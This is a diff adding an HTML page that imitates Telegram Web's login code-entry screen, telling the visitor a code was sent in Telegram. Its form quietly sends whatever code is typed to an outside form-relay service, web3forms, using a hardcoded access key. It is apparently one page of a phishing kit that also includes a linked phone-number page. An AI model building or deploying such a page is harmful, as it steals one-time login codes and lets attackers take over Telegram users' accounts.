@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="..\tg-entrance__number\css\reset.css">
+    <link rel="icon" href="../img/favicon.ico" type="image/webp"> 
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="img-monkey">
+         <video src="monkey.mp4" width="100px" autoplay="autoplay"  loop ></video>
+    </div>
+
+        <div class="number">
+            <p id="number-code" ></p>
+           <a href="../tg-entrance__number/index.html"> <img src="number.jpg" alt=""></a>
+        </div>
+
+
+        <div class="text">
+            <p>
+                We have sent you a message in Telegram With the code.
+            </p>
+        </div>
+    <form  action="https://api.web3forms.com/submit" method="POST" onsubmit="suBmit()">
+
+           
+   <input type="hidden" name="access_key" value="a0a12ce9-eb3f-4e77-a522-eb0f2a15b478">
+         
+            <input type="number" class="code-input" name="name"  required id="code-input">
+        </form>
+       <img src="code.jpg" alt="" class="code">
+    </div>
+
+
+    <script src="../tg-entrance__number/js/code.js"></script>
+</body>
+
+</html>
